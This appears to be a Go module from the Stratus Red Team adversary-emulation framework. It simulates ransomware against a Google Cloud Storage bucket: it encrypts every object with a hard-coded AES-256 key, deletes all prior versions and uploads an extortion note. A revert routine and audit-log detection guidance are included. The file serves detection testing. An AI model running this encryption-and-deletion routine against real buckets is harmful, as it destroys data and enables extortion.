package gcp

import (
    "context"
    _ "embed"
    "fmt"
    "log"
    "sort"
    "time"
    "cloud.google.com/go/storage"
    gcp_utils "github.com/datadog/stratus-red-team/v2/internal/utils/gcp"
    "github.com/datadog/stratus-red-team/v2/pkg/stratus"
    "github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
)

//go:embed main.tf
var tf []byte

const RansomNoteFilename = `FILES-DELETED.txt`
const RansomNoteContents = `Your data is backed up in a safe location. To negotiate with us for recovery, get in touch with xathrya@reversing.id. In 7 days, if we don't hear from you, that data will either be sold or published, and might no longer be recoverable.`

// must be 32-byte AES-256 key
var EncryptionKey []byte = []byte("985beabfecf424ebebcfcc2cb4d95dfa")

func init() {
    const CodeBlock = "```"
    const AttackTechniqueId = "gcp.impact.gcs-ransomware-server-side-encryption"

    stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
        ID:           AttackTechniqueId,
        FriendlyName: "GCS Ransomware through server-side encryption",
        Description: `
Simulates ransomware activity that encrypt bucket objects with a static key, through server-side encryption, then uploads a ransom note.

Warm-up:

- Create a cloud storage bucket with versioning enabled
- Create a number of files in the bucket, with random content and extensions

Detonation:

- List all available objects and their versions in the bucket
- Overwrite every file (object) in the bucket with its encrypted version.
- Upload a ransom note to the bucket

Note: The attack does not need to disable versioning, which does not protect against ransomware. This attack removes all versions of the objects in the bucket.

References:

- [Ransomware in the cloud](https://invictus-ir.medium.com/ransomware-in-the-cloud-7f14805bbe82)
- https://www.firemon.com/what-you-need-to-know-about-ransomware-in-aws/
- https://rhinosecuritylabs.com/aws/s3-ransomware-part-1-attack-vector/
`,
        Detection: `
You can detect ransomware activity by identifying abnormal patterns of objects being downloaded or written in the bucket.
In general, this can be done through Cloud Logging for storage.objects.delete and storage.objects.get events.

Data Access logging for GCS bucket is disabled by default, thus we need to enable it (if not enabled).

- Go to "IAM & Admin" -> "Audit Logs"
- Locate "Google Cloud Storage"
- on "Permission Types", check the "Data write"

Sample event <code>storage.objects.delete</code>, shortened for readability:

` + CodeBlock + `
{
  "logName": "projects/my-project-id/logs/cloudaudit.googleapis.com%2Fdata_access",
  "protoPayload": {
    "authenticationInfo": {
      "principalEmail": "username@service.com",
    },
    "methodName": "storage.objects.delete",
    "resourceName": "projects/_/buckets/my-bucket-name/objects/my-object-name.extension",
    "serviceName": "storage.googleapis.com",
  },
  "resource": {
    "type": "gcs_bucket",
  },
  "severity": "INFO"
}
` + CodeBlock + `
`,
        Platform:                   stratus.GCP,
        IsIdempotent:               false,
        MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Impact},
        PrerequisitesTerraformCode: tf,
        Detonate:                   detonate,
        Revert:                     revert,
    })
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
    gcp := providers.GCP()
    ctx := context.Background()

    // result from terraform
    bucketName := params["bucket_name"]

    log.Println("Simulating a ransomware attack on bucket " + bucketName)

    // get the client
    client, err := storage.NewClient(ctx, gcp.Options())
    if err != nil {
        return fmt.Errorf("unable to create new client: %w", err)
    }
    defer client.Close()

    // get the bucket
    bucket := client.Bucket(bucketName)

    // download all objects (into memory only)
    if err := gcp_utils.DownloadAllObjects(bucket, ctx); err != nil {
        return fmt.Errorf("failed to remove objects in the bucket: %w", err)
    }

    // encrypt all objects
    if err := encryptAllObjects(bucket, ctx); err != nil {
        return fmt.Errorf("failed to encrypt objects in the bucket: %w", err)
    }

    // upload ransom note
    log.Println("uploading ransom note")
    content := []byte(RansomNoteContents)
    if _, err := gcp_utils.WriteBucketObject(bucket, ctx, RansomNoteFilename, content); err != nil {
        return fmt.Errorf("failed to upload ransom note to the bucket: %w", err)
    }

    return nil
}

func revert(params map[string]string, providers stratus.CloudProviders) error {
    gcp := providers.GCP()
    ctx := context.Background()

    // result from terraform
    bucketName := params["bucket_name"]

    log.Println("Decrypting all files in the bucket ")

    // get the client
    client, err := storage.NewClient(ctx, gcp.Options())
    if err != nil {
        return fmt.Errorf("unable to create new client: %w", err)
    }
    defer client.Close()

    // get the bucket
    bucket := client.Bucket(bucketName)

    // decrypt all objects
    if err := decryptAllObjects(bucket, ctx); err != nil {
        return fmt.Errorf("failed to encrypt objects in the bucket: %w", err)
    }

    return nil
}

func encryptAllObjects(bucket *storage.BucketHandle, ctx context.Context) error {
    // get the objects and its version
    objects, err := gcp_utils.ListAllObjectVersions(bucket, ctx)
    if err != nil {
        return fmt.Errorf("unable to list bucket objects: %w", err)
    }

    log.Printf("found %d object versions to encrypt", len(objects))
    log.Println("encrypting all objects with most recent version one by one with the secret AES256 encryption key")

    // create a map to group objects by name and track their versions
    objectVersions := make(map[string][]gcp_utils.BucketObject)
    for _, obj := range objects {
        objectVersions[obj.Name] = append(objectVersions[obj.Name], obj)
    }

    // encrypt all
    ctx, cancel := context.WithTimeout(ctx, 60 * time.Second)
    defer cancel()

    for objName, versions := range objectVersions {
        obj := bucket.Object(objName)

        // sort versions by generation (newest first)
        sort.Slice(versions, func(i, j int) bool {
            return versions[i].Generation > versions[j].Generation
        })

        // encrypt the latest version
        latestVersion := versions[0]
        latestObj := bucket.Object(objName).Generation(latestVersion.Generation)
        if _, err := obj.Key(EncryptionKey).CopierFrom(latestObj).Run(ctx); err != nil {
            return fmt.Errorf("failed to encrypt object %s: %w", objName, err)
        }

        // delete all
        for _, version := range versions {
            if err := bucket.Object(objName).Generation(version.Generation).Delete(ctx); err != nil {
                return fmt.Errorf("failed to delete generation %d of object %s: %w", version.Generation, objName, err)
            }
        }
    }

    log.Println("successfully encrypt all objects in the bucket")
    return nil
}

func decryptAllObjects(bucket *storage.BucketHandle, ctx context.Context) error {
    // get the objects and its version
    objects, err := gcp_utils.ListAllObjectVersions(bucket, ctx)
    if err != nil {
        return fmt.Errorf("unable to list bucket objects: %w", err)
    }

    log.Println("decrypting all objects one by one with the secret AES256 decryption key")

    // decrypt all
    ctx, cancel := context.WithTimeout(ctx, 60 * time.Second)
    defer cancel()
    
    for _, object := range objects {
        // ignore the ransom note
        if object.Name == RansomNoteFilename {
            continue
        }

        obj := bucket.Object(object.Name)

        // decrypt object content
        if _, err := obj.CopierFrom(obj.Key(EncryptionKey)).Run(ctx); err != nil {
            return fmt.Errorf("unable to encrypt file %s: %w", object.Name, err)
        }
        
        // delete old object
        if err := obj.Generation(object.Generation).Delete(ctx); err != nil {
            return fmt.Errorf("failed to delete old generation %s: %w", object.Name, err)
        }
    }

    log.Println("successfully decrypt all objects in the bucket")
    return nil
}
